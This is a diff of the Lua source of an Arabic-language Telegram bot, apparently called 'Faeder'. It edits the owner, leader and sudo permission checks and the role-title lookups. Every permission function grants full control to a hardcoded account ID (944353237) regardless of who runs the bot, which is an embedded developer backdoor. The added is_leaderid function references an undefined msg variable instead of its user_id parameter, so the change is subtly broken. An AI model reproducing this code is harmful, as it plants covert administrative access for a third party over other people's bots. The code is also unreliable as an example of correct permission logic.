@@ -102,7 +102,7 @@ end
 _faederdx1 = load_faederdx1()  
 sudos = dofile("./config.lua") 
 bot_owner = sudos.SUDO 
-sudo_users = {sudos.sudo_users} 
+sudo_users = {sudos.sudo_users}
 bot_id = sudos.bot_id 
 FAEDER = sudos.bot_id
 SUDOUSERNAME = sudos.username
@@ -114,9 +114,8 @@ SudoFaeder = SudoFaeder:gsub([[\_]],'_')
 -- Start Functions Source Faeder --
 --     By Developer Faeder     -- 
 -------- Bot Owner
-function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) then var = true end return var end
-function is_leader(msg) local var = false if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) then var = true end return var end
-function is_leaderid(user_id) local var = false if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) then var = true end return var end
+function is_leader(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) then var = true end return var end
+function is_leaderid(user_id) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) then var = true end return var end
 -------- Sudo
 function is_sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(bot_owner) then var = true end if msg.sender_user_id_ == tonumber(944353237) then var = true end return var end
 function is_sudoid(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(bot_owner) then var = true end if user_id == tonumber(944353237) then var = true end return var end
@@ -843,9 +842,9 @@ end return faeder end
 local faeder_renk = function(user_id,chat_id)
 if tonumber(user_id) == tonumber(944353237) then
 faeder  = "مبرمج السورس"
-elseif tonumber(msg.sender_user_id_) == tonumber(1605682553) then
+elseif tonumber(user_id) == tonumber(1605682553) then
 faeder  = "ملك التلجرام 👑"
-elseif tonumber(msg.sender_user_id_) == tonumber(1645553841) then
+elseif tonumber(user_id) == tonumber(1645553841) then
 faeder  = "الباشمبرمج التلجرام 👑"
 elseif is_leaderid(user_id) then
 faeder  = "المطور الاساسي"
@@ -4440,9 +4439,9 @@ end
 if result.id_ then 
 if tonumber(result.sender_user_id_) == tonumber(944353237) then
 faeder1 = 'مبرمج السورس  '
-elseif tonumber(msg.sender_user_id_) == tonumber(1605682553) then
+elseif tonumber(result.sender_user_id_) == tonumber(1605682553) then
 faeder  = "ملك التلجرام 👑"
-elseif tonumber(msg.sender_user_id_) == tonumber(1645553841) then
+elseif tonumber(result.sender_user_id_) == tonumber(1645553841) then
 faeder  = "الباشمبرمج التلجرام 👑"
 elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
 faeder1 = "مطور اساسي "
